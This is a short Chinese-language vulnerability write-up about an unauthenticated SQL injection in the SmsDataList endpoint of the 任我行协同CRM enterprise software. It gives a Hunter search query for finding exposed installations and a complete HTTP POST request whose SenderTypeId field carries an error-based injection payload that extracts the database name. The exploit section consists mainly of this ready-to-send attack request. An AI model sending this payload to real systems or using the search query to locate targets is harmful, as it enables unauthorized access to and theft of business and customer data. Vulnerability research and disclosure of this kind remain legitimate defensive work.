# 任我行协同CRM SmsDataList SQL注入漏洞

# 一、漏洞简介
任我行CRM是CRM（客户关系管理）、OA（自动化办公）、OM（目标管理）、KM（知识管理）、HR（人力资源）一体化的企业管理软件。通过建立组织运营管理铁三角（目标行动-企业文化-知识复制），一切围绕以客户为中心的全方位、透明化业务管理（市场-销售-生产-服务），打造企业组织高效协同的运营管理平台。任我行协同CRM存在SQL注入漏洞，远程未授权攻击者可利用此漏洞获取敏感信息，进一步利用可能获取目标系统权限。

# 二、影响版本
+ 任我行协同CRM

# 三、资产测绘
+ hunter`app.name="任我行 CRM"`
+ 登录页面

![1693755730548-775a0355-02ba-402a-84c9-f9c7641487b3.png](./img/fb9-U7Q5eukS7Cj1/1693755730548-775a0355-02ba-402a-84c9-f9c7641487b3-878825.png)

# 四、漏洞复现
```plain
POST /SMS/SmsDataList/?pageIndex=1&pageSize=30 HTTP/1.1
Host: {hostname}
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Content-Length: 23

Keywords=&StartSendDate=2020-06-17&EndSendDate=2020-09-17&SenderTypeId=0000000000'and 1=convert(int,(db_name())) AND 'CvNI'='CvNI
```

![1693755785656-95d682b9-8ed9-43d5-9820-2b9472793922.png](./img/fb9-U7Q5eukS7Cj1/1693755785656-95d682b9-8ed9-43d5-9820-2b9472793922-602439.png)

![1693755800442-ba863c4c-023b-4191-a0cd-d7b7f1f28132.png](./img/fb9-U7Q5eukS7Cj1/1693755800442-ba863c4c-023b-4191-a0cd-d7b7f1f28132-482931.png)



> 更新: 2024-02-29 23:55:50  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/qng5bs4r6v7vunkw>